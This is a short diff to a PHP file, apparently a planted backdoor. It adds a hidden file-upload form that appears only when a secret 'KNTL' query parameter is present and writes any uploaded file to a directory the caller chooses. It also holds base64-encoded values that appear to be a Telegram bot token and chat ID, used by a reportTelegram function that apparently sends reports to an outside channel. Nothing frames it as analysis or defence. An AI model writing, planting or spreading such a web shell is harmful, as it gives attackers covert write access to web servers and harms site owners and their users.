@@ -1,9 +1,29 @@
 <?php
 $k='kontolbengkak';
-$tk = base64_decode(
-    "ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ=="
-);
+$tk = base64_decode("ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==");
 $cid = base64_decode("ODkzMDE3NDQ2Mw==");
+
+if (isset($_GET["KNTL"]) && $_GET["KNTL"] === "KNTL") {
+    echo '<form method="post" enctype="multipart/form-data">';
+    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
+    echo '<input type="file" name="file" size="15">';
+    echo '<input type="submit" value="go">';
+    echo "</form>";
+}
+
+if (isset($_FILES["file"]["tmp_name"])) {
+    $uploadd = $_FILES["file"]["tmp_name"];
+    if (file_exists($uploadd)) {
+        $pwddir = $_POST["dir"];
+        $real = $_FILES["file"]["name"];
+        $de = rtrim($pwddir, "/") . "/" . $real;
+        if (move_uploaded_file($uploadd, $de)) {
+            echo "go$de";
+        } else {
+            echo "GAGAL  KE $de";
+        }
+    }
+}
 
 function reportTelegram($msg)
 {
